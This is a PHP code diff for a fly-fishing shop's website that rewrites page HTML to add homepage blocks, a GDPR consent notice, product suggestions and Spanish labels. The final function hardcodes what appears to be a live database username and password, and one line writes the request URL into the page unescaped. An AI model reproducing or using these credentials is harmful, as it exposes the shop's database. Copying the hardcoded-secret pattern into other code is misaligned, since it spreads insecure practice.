+		if((strpos($buffer, ' cms-50 ')!==false || 1==1) && strpos($buffer, '<body id="index"')===false)
+		{
+			/*$contenido='<div class="cyp_bloques_alt"><div class="container">
+			<a href="https://www.theflycenter.com/es/content/category/2-dreams"><div class="cyp_bloques_alt_elem" style="background:url(../../../../img/home_dreams.jpg)"><div class="cyp_bloques_alt_elem_texto">Dreams</div></div></a>
+			<a href="https://www.theflycenter.com/es/content/category/3-escuela-de-pesca"><div class="cyp_bloques_alt_elem cyp_bloques_alt_sep" style="background:url(../../../../img/home_escuela.jpg)"><div class="cyp_bloques_alt_elem_texto">Escuela de Pesca<br/>y Montaje</div></div></a>
+			<a href="https://www.theflycenter.com/es/content/55-tienda-fisica"><div class="cyp_bloques_alt_elem cyp_bloques_alt_sep" style="background:url(../../../../img/home_fisica.jpg)"><div class="cyp_bloques_alt_elem_texto">Tienda Física<br/>Madrid</div></div></a>
+			<a href="https://www.theflycenter.com/es/content/24-the-flycenter-club"><div class="cyp_bloques_alt_elem cyp_bloques_alt_sep" style="background:url(../../../../img/home_club.jpg)"><div class="cyp_bloques_alt_elem_texto">Club de Pesca</div><img src="../../../../img/logo_club.png"></div></a>
+			</div></div>';*/
+
+			$contenido='<div class="cyp_bloques_alt_3 cyp_bloques_alt_3_mobile"><div class="container">
+			<a href="https://www.theflycenter.com/es/content/category/3-escuela-de-pesca"><div class="cyp_bloques_alt_elem_3" style="background:url(../../../../img/home_escuela.jpg)"><div class="cyp_bloques_alt_elem_texto">Escuela de Pesca<br/>y Montaje</div></div></a>
+			<a href="https://www.theflycenter.com/es/content/55-tienda-fisica"><div class="cyp_bloques_alt_elem_3" style="background:url(../../../../img/home_fisica.jpg)"><div class="cyp_bloques_alt_elem_texto">Tienda Física<br/>Madrid</div></div></a>
+			<a href="https://www.theflycenter.com/es/content/24-the-flycenter-club"><div class="cyp_bloques_alt_elem_3" style="background:url(../../../../img/home_club.jpg)"><div class="cyp_bloques_alt_elem_texto">Club de Pesca</div><img src="../../../../img/logo_club.png"></div></a>
+			</div></div>';
+
+			$buffer=str_replace('<div class="columns-container">', '<div class="columns-container">'.$aviso_provisional.$contenido, $buffer);
+		}
+	}
+	//FIN ENCABEZADO NUEVO
+
+	//VIAJES
+	/*if(strpos($buffer, "cms-viajes")!==false)
+	{
+		$buffer=str_replace('<div class="block-cms">', '<div class="cyp_viajes_seccion"><img src="https://www.theflycenter.com/modules/jscomposer/uploads/viajes_encabezado.jpg"/></div><div class="block-cms">', $buffer);
+	}*/
+	//FIN VIAJES
+
+	//ESCUELAS
+	/*if(strpos($buffer, "cms-escuela")!==false)
+	{
+		$buffer=str_replace('<div class="block-cms">', '<div class="cyp_escuela_seccion"><img src="https://www.theflycenter.com/img/cms/logo_escuela_pesca.gif"/></div><div class="block-cms">', $buffer);
+	}*/
+	//FIN ESCUELAS
+
+	$rgpd='<div class="cyp_rgpd_box" style="margin:20px 0px">
+	<input type="checkbox" name="rgpd_1" required> He leído y acepto la política de <a href="https://www.theflycenter.com/es/content/57-politica-de-privacidad" target="_blank" style="color:#3fac4f">protección de datos</a><br/>
+	<input type="checkbox" name="rgpd_2" required> Acepto recibir información y/o newsletter de FLY SHOP CENTER SLL, relacionadas nuestro sector, de acuerdo a nuestra <a href="https://www.theflycenter.com/es/content/57-politica-de-privacidad" target="_blank" style="color:#3fac4f">política de privacidad</a>
+
+	<div style="width:100%;margin-top:20px;border:solid;border-width:1px;border-color:black;padding:10px">
+	<strong>Responsable del tratamiento:</strong> los datos tratados en el presente formulario, serán tratados por la empresa FLY SHOP CENTER, S.L.L, con CIF B87066981 y domicilio en C/ FUENTEMAR 20, B24 - 28823 COSLADA (MADRID), como Responsable del Tratamiento de los datos.<br/><br/>
+	<strong>Finalidad:</strong> le queremos informar que la finalidad de los datos recogidos es la gestión de usuarios de la página web, atender las consultas planteadas, así como enviarle información comercial y/o newsletter.<br/><br/>
+	<strong>Legitimación:</strong> consentimiento otorgado marcando la correspondiente casilla de verificación. Sus datos personales serán tratados en base a nuestra política de privacidad.<br/><br/>
+	<strong>Destinatarios:</strong> no se cederán datos a terceros, salvo obligación legal.<br/><br/>
+	<strong>Derechos:</strong> puede acceder, rectificar y suprimir sus datos, portabilidad de los datos, limitación u oposición a su tratamiento, derecho a no ser objeto de decisiones automatizadas, así como a obtener información clara y transparente sobre el tratamiento de sus datos, tal como se explica en la información adicional. Desde FLY SHOP CENTER, S.L.L, ponemos el máximo empeño para cumplir con la normativa de protección de datos dado que es el activo más valioso para nosotros. No obstante, le informamos que en caso de que usted entienda que sus derechos se han visto menoscabados, puede ponerse en contacto con nosotros en daniel@theflycenter.com o ante la Agencia Española de Protección de Datos (AEPD).<br/><br/>
+	<strong>Información adicional:</strong> puede consultar la información adicional y detallada sobre <a href="https://www.theflycenter.com/es/content/57-politica-de-privacidad" target="_blank" style="color:#3fac4f">protección de datos</a>.
+	</div>
+	</div>';
+
+	if(strpos($current_url, "/contactenos")!==false)
+	{
+		$buffer=str_replace('<div class="submit">', $rgpd.'<div class="submit">', $buffer);
+	}
+
+	if(strpos($buffer, 'id="cms"')!==false)
+	{
+		$buffer=str_replace('<meta property="og:url" content="https://www.theflycenter.com/es/index.php?controller=cms">', '<meta property="og:url" content="https://'.$current_url.'">', $buffer);
+	}
+
+	if(strpos($current_url, "/content/61")!==false)
+	{
+		//$buffer=str_replace('<meta property="og:url" content="https://www.theflycenter.com/es/index.php?controller=cms">', '<meta property="og:url" content="https://www.theflycenter.com/es/content/61-primer-certamen-maestros-del-atado">', $buffer);
+		$buffer=str_replace('<meta property="og:image" content="https://www.theflycenter.com/img/the-fly-center-logo-1553092615.jpg">', '<meta property="og:image" content="https://www.theflycenter.com/img/primer-certamen-Maestros500.jpg">', $buffer);
+	}
+
+	//AVISO PARA SUGERIR OTRO PRODUCTO
+	$producto_sugerencia=false;
+
+	if(strpos($current_url, "/1944-")!==false)
+	{
+		$producto_sugerencia_alt='<p>Artículo no disponible, le recomendamos este otro artículo similar o superior:</p><a href="https://www.theflycenter.com/es/flyfriends/5682-anzuelo-sin-muerte-flycreek-fc30-bl.html">Anzuelo Flycreek FC30 BL</a>';
+
+		$producto_sugerencia=true;
+	}
+
+	if($producto_sugerencia==true)
+	{
+		$producto_sugerencia_mensaje='<div class="cyp_producto_sugerencia">'.$producto_sugerencia_alt.'</div>';
+
+		$buffer=str_replace('<div class="pb-right-column col-xs-12 col-sm-4 col-md-3">', '<div class="pb-right-column col-xs-12 col-sm-4 col-md-3 cyp_producto_ocultar_precio">'.$producto_sugerencia_mensaje, $buffer);
+	}
+	//FIN AVISO PARA SUGERIR OTRO PRODUCTO
+
+	//PRODUCTOS CON TABLA DE COMBINACIONES
+	if(strpos($buffer, '<body id="product"')!==false && strpos($buffer, 'table_declinaisons')!==false)
+	{
+		$buffer=str_replace('<div class="table_declinaisons"', '<div id="opciones" class="table_declinaisons"', $buffer);
+
+		$cyp_ver_opciones='<p class="buttons_bottom_block no-print ver_opciones"><a href="#opciones" class="exclusive"><span>Ver opciones</span></a></p>';
+		$buffer=str_replace('<div class="box-info-product">', '<div class="box-info-product">'.$cyp_ver_opciones, $buffer);
+
+		$buffer=str_replace('product product-', 'product cyp_ver_opciones product-', $buffer);		
+	}
+	//FIN PRODUCTOS CON TABLA DE COMBINACIONES
+
+	$buffer=str_replace(">Combinations<", ">Combinaciones<", $buffer);
+	$buffer=str_replace(">reference<", ">Referencia<", $buffer);
+	$buffer=str_replace("> Available now<", "> En Stock - 24h<", $buffer);
+	$buffer=str_replace("> Available later<", "> Almacén EU<", $buffer);
+	$buffer=str_replace(">Price<", ">Precio<", $buffer);
+	$buffer=str_replace(">quantity<", ">Cantidad<", $buffer);
+	$buffer=str_replace(">Add to cart<", "><", $buffer);
+	$buffer=str_replace('"Add to cart"', '"Añadir al carrito"', $buffer);
+	$buffer=str_replace("> This product is no longer in stock<", "> Sin Stock<", $buffer);
+
+	$buffer=str_replace("gratuitos desde 69€", "gratuitos desde 89€", $buffer);
+	$buffer=str_replace("gratis a partir de 69€", "gratis a partir de 89€", $buffer);
+
+	$buffer=str_replace('<img src="/img/cyp_envio_gratis.png">', '<img class="cyp_etiqueta_envio_gratis" style="display:none" src="/img/cyp_envio_gratis.png">', $buffer);
+
+	$buffer=str_replace('http://www.theflycenter.com', 'https://www.theflycenter.com', $buffer);
+
+	return $buffer;
+}
+
+function bbdd()
+{
+	$db=new mysqli("localhost","theflyce_psuser","RZ&=3zZ8qjOR","theflyce_ps");
+
+	return $db;
+}
